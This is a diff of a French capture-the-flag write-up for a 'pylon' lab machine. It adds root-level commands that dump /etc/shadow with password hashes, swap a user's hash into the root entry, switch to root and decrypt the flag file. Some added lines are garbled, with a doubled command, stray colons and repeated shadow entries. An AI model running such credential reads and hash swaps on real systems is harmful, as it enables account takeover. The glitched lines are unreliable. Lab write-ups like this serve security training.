@@ -31,7 +31,7 @@ Megapixels                      : 4.9
 
 Dans les donées exif il y a un lien.  
 
-![page](./page1-01.png)    
+![page](./Task1-01.png)    
 
 Le lien nous amène vers une page cyberchef tout faite.   
 
@@ -576,14 +576,45 @@ gpg: decrypt_message failed: Permission denied
 ```
 
 On exécute openvpn avec le fichier client.opvn.   
-On lance un shell persistant.   
+On lance un shell persistant.   :
 Dans le repértoire root on a un fichier root.txt.gpg.   
 On essaie de le décoder mais on a pas les bonnes permisions.  
 
 ```bash
-bash-4.4# cat /etc/shadow
+bash-4.4# cat /etc/shadowbash-4.4# cat /etc/shadow
 root:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44GjwTlJ4n1OcsxX0ntsa8Uue9.:18480:0:99999:7:::
 daemon:*:18480:0:99999:7:::
+bin:*:18480:0:99999:7:::
+sys:*:18480:0:99999:7:::
+sync:*:18480:0:99999:7:::
+games:*:18480:0:99999:7:::
+man:*:18480:0:99999:7:::
+lp:*:18480:0:99999:7:::
+mail:*:18480:0:99999:7:::
+news:*:18480:0:99999:7:::
+uucp:*:18480:0:99999:7:::
+proxy:*:18480:0:99999:7:::
+www-data:*:18480:0:99999:7:::
+backup:*:18480:0:99999:7:::
+list:*:18480:0:99999:7:::
+irc:*:18480:0:99999:7:::
+gnats:*:18480:0:99999:7:::
+nobody:*:18480:0:99999:7:::
+systemd-network:*:18480:0:99999:7:::
+systemd-resolve:*:18480:0:99999:7:::
+syslog:*:18480:0:99999:7:::
+messagebus:*:18480:0:99999:7:::
+_apt:*:18480:0:99999:7:::
+lxd:*:18480:0:99999:7:::
+uuidd:*:18480:0:99999:7:::
+dnsmasq:*:18480:0:99999:7:::
+landscape:*:18480:0:99999:7:::
+pollinate:*:18480:0:99999:7:::
+sshd:*:18657:0:99999:7:::
+pylon:$6$kBtkIi0w$zj80m4J62jDhdffz6U.Fy/9rBhfLOD5YybkOXUrwQthF1svHTXfB6wCJ7KaZ9Dl0euJmjFbiIbtQIICIpE04W0:18657:0:99999:7:::
+pood:$6$ivWUkR1k$XnYAc7OJJ63P/lgYzNWLiFMydrOFP/qrARMNcjHX1H4sIGFEyVQKAOedWLDY2nHU8rxx7hABmr4JT3uM74Bm5.:18657:0:99999:7:::
+lone:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44GjwTlJ4n1OcsxX0ntsa8Uue9.:18657:0:99999:7:::
+:
 bin:*:18480:0:99999:7:::
 sys:*:18480:0:99999:7:::
 sync:*:18480:0:99999:7:::
@@ -618,3 +649,17 @@ lone:$6$vfrtqwG3$K1wwsz.rtdOBJ.P3vrNwVZN66iMJjTdTRQRIPmJAvXXxqrEk5JRjlRYCdYB44Gj
 
 On copie le hash dans root.   
 
+```bash
+bash-4.4# su
+Password: 
+root@pylon:~# ls
+root.txt.gpg
+root@pylon:~# gpg -d root.txt.gpg 
+gpg: encrypted with 3072-bit RSA key, ID 91B77766BE20A385, created 2021-01-27
+      "I am g ROOT <root@pylon.thm>"
+ThM{OpenVPN_script_pwn}
+```
+
+On s'identifie, on a un vrai compte root.  
+On peut décode root.txt.gpg.   
+Le flag est :  ThM{OpenVPN_script_pwn}    
